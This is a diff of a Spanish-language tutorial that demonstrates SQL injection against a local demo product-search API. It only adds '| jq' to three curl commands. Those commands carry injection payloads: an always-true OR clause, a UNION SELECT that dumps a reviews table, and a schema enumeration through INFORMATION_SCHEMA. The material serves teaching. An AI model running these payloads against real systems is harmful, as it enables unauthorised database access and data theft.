@@ -38,7 +38,7 @@ String query = "SELECT * FROM products WHERE name LIKE '%" + q + "%' " +
 
 ```bash
 curl -G "http://localhost:8080/api/products/search" \
-  --data-urlencode "q=' OR '1'='1"
+  --data-urlencode "q=' OR '1'='1" | jq
 ```
 
 La query resultante en el servidor será:
@@ -65,7 +65,7 @@ La BD tiene una tabla `reviews` con texto de usuarios. Con UNION se extrae:
 
 ```bash
 curl -G "http://localhost:8080/api/products/search" \
-  --data-urlencode "q=x' UNION SELECT id, CAST(product_id AS VARCHAR), text, CAST(rating AS DECIMAL), NULL, NULL, NULL, NULL FROM reviews--"
+  --data-urlencode "q=x' UNION SELECT id, CAST(product_id AS VARCHAR), text, CAST(rating AS DECIMAL), NULL, NULL, NULL, NULL FROM reviews--"  | jq
 ```
 
 Devuelve todas las reseñas disfrazadas de productos. En un caso real, esta técnica se usa para extraer usuarios, contraseñas, tokens, etc.
@@ -80,7 +80,7 @@ Devuelve todas las reseñas disfrazadas de productos. En un caso real, esta téc
 
 ```bash
 curl -G "http://localhost:8080/api/products/search" \
-  --data-urlencode "q=x' UNION SELECT NULL, TABLE_NAME, COLUMN_NAME, NULL, NULL, DATA_TYPE, NULL, NULL FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='PUBLIC'--"
+  --data-urlencode "q=x' UNION SELECT NULL, TABLE_NAME, COLUMN_NAME, NULL, NULL, DATA_TYPE, NULL, NULL FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='PUBLIC'--"  | jq
 ```
 
 Devuelve todas las tablas y columnas de la BD. Primer paso real de un atacante para mapear la base de datos antes de extraer datos sensibles.
